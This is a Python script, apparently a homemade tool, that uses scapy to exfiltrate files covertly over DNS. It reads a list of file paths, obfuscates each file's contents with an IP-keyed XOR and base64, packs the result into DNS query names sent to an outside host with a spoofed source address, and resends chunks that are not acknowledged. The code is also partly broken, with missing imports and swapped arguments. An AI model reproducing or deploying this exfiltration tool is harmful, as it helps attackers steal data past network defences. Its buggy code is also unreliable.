import base64
from scapy.all import *
import os
from time import sleep
def simple_encrypt(string,ip):
    """encrypts string with ip"""
    """encrypts a string until end of line"""
    blah=ip.split('.')
    i=0
    encoded=""
    base64xor=[]
    for n in string:
        base64xor.append(chr(ord(n) ^ int(blah[i])))
        i+=1
        if i ==4:
            i =0

    xor_result_string = ''.join(base64xor)
    base=base64.b64encode(xor_result_string.encode())
    return base

def send_dns(dns_ip, ip, msg):
    """sends msg over dns encrypted with ip """
    # Calculate the total number of packets to send
    how_many_msg = math.ceil(len(msg) / 180)
    sequence = 1
    header = {}  # Store each packet part by sequence number
    max_retries = 5
    partmsg = ""
    how_many=how_many_msg
    n=0
    # Set up server socket for receiving acknowledgments
    ack_server= socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    server = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        ack_server.connect((dns_ip,8333))
    except Exception as e:
        print("Could not bind: ", e)

    while how_many > 0:
        # If there is more message to send than 180 characters
        if len(msg) > 180:
            partmsg = msg[:180]
            msg = msg[180:]  # Remainder of the message
        else:
            partmsg = msg
            msg = ""  # Mark last segment
        # Store the part in header for possible resends
        
        header[sequence] = partmsg
        headlen = str(len(str(sequence)) +len(str(how_many_msg)) + len(ip) + 1)
        qname = f"{sequence}{how_many_msg}{headlen}{ip}{partmsg}"
        ip_layer = IP(src=dns_ip)
        udp_layer = UDP(sport=RandShort(), dport=8222)
        dns_layer = DNS(rd=1, qd=DNSQR(qname=qname), ar=DNSRROPT())
        packet = ip_layer / udp_layer / dns_layer
        send(packet)
        how_many= how_many-1
        sequence += 1

    # Receive acknowledgments and resend any missing packets
    while header:
       
        try:
            if not header:
                break
            print("Waiting for ACKs...")
            ack= ack_server.recv(2)
            sleep(2)
            ack_sequence = int(ack.decode())
            if ack_sequence in header:
                header.pop(ack_sequence)  # Remove acknowledged packets

        except socket.timeout:
            print("Timeout, retrying missing packets...")
            for seq, data in list(header.items()):
                retries = 0
                while retries < max_retries:
                    # Resend packet with sequence number
                    headlen = str(len(str(seq))+len(str(how_many_msg)) + len(ip) + 1)
                    qname = f"{seq}{how_many_msg}{headlen}{ip}{data}"
                    dns_layer = DNS(rd=1, qd=DNSQR(qname=qname), ar=DNSRROPT())
                    packet = ip_layer / udp_layer / dns_layer
                    send(packet)
                    print(f"Resending packet {seq}, retry {retries + 1}")
                    retries += 1
                    time.sleep(1)
                    if seq not in header:
                        break  # Stop if acknowledged        
   
def send_encrypted_file(filename,ip,ip_dns,time):
    """send an file to ip_dns encrypted with ip and sleep for time"""
    filecontent=""
    print("send encrypted filed")
    if os.path.isfile(filename):
        with open(filename,"r") as file:
            filecontent= file.read()
            enc_file=simple_encrypt(filecontent,ip)
            send_dns(ip,ip_dns,enc_file.decode())
            sleep(time)
        
def send_all_encrypted_files(filename,ip_encrypt,ip_dns,time):  
    """sends all files listed in filename encrypted with ip and sent to ip_dns, and could sleep for time """  
    if os.path.exists(filename):
        with open(filename,"r") as file:
            for line in file:
                send_encrypted_file(line.strip('\n'),ip_dns,ip_encrypt,0)
    else:
        raise Exception("NoFile")